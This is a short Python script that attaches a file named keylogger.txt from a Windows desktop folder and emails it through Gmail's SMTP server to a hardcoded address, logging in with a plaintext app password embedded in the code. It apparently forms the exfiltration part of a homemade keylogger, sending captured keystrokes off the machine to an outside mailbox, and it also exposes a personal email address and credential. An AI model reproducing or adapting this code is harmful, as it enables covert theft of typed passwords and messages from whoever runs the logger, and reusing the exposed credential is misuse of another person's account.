

import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
   
fromaddr = "gargkid2011@gmail.com"
toaddr = "gargkid2011@gmail.com"
   

msg = MIMEMultipart() 
      
msg['From'] = fromaddr 
  

msg['To'] = toaddr 

msg['Subject'] = "trial"
  

body = "it worked!"
  

msg.attach(MIMEText(body, 'plain')) 
  

filename = "keylogger.txt"
attachment = open("C:/Users/varun/OneDrive/Desktop/keylogger.txt", "rb") 
  

p = MIMEBase('application', 'octet-stream') 
  

p.set_payload((attachment).read()) 
  

encoders.encode_base64(p) 
   
p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
  

msg.attach(p) 
  

s = smtplib.SMTP('smtp.gmail.com', 587) 
  

s.starttls() 
  

s.login(fromaddr, "twilrfknpmcbnrcf") 
  

text = msg.as_string() 
  

s.sendmail(fromaddr, toaddr, text) 
  

s.quit() 